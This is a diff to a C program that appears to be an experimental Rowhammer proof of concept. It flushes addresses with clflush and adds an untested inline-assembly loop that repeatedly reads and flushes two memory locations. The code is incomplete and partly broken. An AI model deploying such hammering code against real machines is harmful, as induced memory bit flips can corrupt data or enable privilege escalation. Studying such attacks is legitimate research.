@@ -13,6 +13,7 @@
 #include <sys/time.h>
 #include <sys/wait.h>
 #include <time.h>
+#include <stdbool.h>
 #include <unistd.h>
 
 
@@ -75,7 +76,7 @@ int main()
       for (int i = 0; i < 8; i++){
          addrs[i] = (uint32_t *) gen_addr();
          addrs[(i+1)] = (uint32_t *) gen_addr();
-         for (int j = 0; j <addrs.size(); j++){
+         for (int j = 0; j <8; j++){
             asm volatile("clflush (%0)" : : "r" (addrs[j]) : "memory");
          }
       }
@@ -95,13 +96,27 @@ int main()
 
      //proof of concept attack demonstrated in CMU paper.
 	 // inline assembly, have NOT tested this.
-   	asm volatile("mainForever:
-   			mov (X), %eax //move value x into register a
-   			mov (Y), %ebx // move value y into register b
-   			clflush (X) //flush x out of the cache
-   			clflush (Y) //flush y out of the cache
-   			mfence // make sure to wait for x and y to be fully evicted from cache
-   			jmp mainForever");
+     //move value x into register a
+     // move value y into register b
+     //flush x out of the cache
+     //flush y out of the cache
+     // make sure to wait for x and y to be fully evicted from cache
+     while(true){
+
+      int dst, src;
+      asm volatile( "goforever:\n" 
+      "mov (X), %%eax \n"
+      "mov (Y), %%ebx \n"
+      "clflush (X)\n"
+      "clflush (Y)\n"
+      "mfence\n"
+      "jmp goforever"
+      : "=r"(dst) /* output */
+      : "r"(src)      /* input */
+      : "%eax");         /* clobbered register */
+     }
+
+
 
 
 	printf("Aloha World\n");
